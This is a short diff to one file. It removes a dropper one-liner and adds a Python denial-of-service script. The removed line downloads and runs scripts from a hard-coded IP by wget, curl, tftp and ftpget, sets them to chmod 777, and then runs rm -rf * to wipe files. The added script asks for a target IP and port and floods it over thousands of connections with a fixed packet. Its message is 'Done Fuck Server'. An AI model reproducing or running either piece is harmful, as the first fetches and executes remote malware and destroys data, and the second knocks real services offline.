@@ -1,1 +1,23 @@
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.65.114.114/ohshit.sh; curl -O http://45.65.114.114/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 45.65.114.114 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 45.65.114.114; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.65.114.114 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
+import socket
+import time
+
+ip = input("IP: ")
+port = int(input("Port: "))
+num_connections = 9999
+
+packet = bytes.fromhex("F10400010900000001000000F2")
+num_send_per_connection = 1000
+
+for _ in range(num_connections):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((ip, port))
+            
+            for _ in range(num_send_per_connection):
+                s.sendall(packet)
+            
+            print(f"Done Fuck Server {ip} <3")
+        except Exception as e:
+            print(f"Error: {e}")
+
+        time.sleep(0)
